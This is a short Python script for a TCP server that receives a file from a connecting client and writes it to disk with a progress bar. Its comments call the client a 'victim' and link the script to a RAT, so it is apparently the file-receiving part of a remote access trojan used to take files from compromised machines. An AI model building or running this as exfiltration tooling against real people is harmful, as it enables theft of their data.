import socket
import tqdm
import os
import server_config


HOST = server_config.SERVER_HOST
PORT = server_config.SERVER_PORT
SEPERATOR = "<SEPERATOR>"
BUFFERSIZE = 4096 # 4 kib Data Transfer

# TCP Socket
# WARNING! This can be reconfigured because we already have an active Connection through the RaT!!!
s = socket.socket()
s.bind((HOST,PORT))
s.listen(10) # Accepted Victim Count

client_socket, address = s.accept() 

def transfer_files(address):
    
    #print(f"[+] {address} is reachable! Receiving function can be used!")
    received = client_socket.recv(BUFFERSIZE).decode()
    filename, filesize = received.split(SEPERATOR) 
    filename = os.path.basename(filename)
    filesize = int(filesize)
    # Transfer and Write the file
    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "wb") as f:
        while True:
            bytes_read = client_socket.recv(BUFFERSIZE)
            if not bytes_read:
                # Transfer is done!
                break
            f.write(bytes_read)
            progress.update(len(bytes_read))
    client_socket.close() # Close Client socket
    s.close() # Close Server socket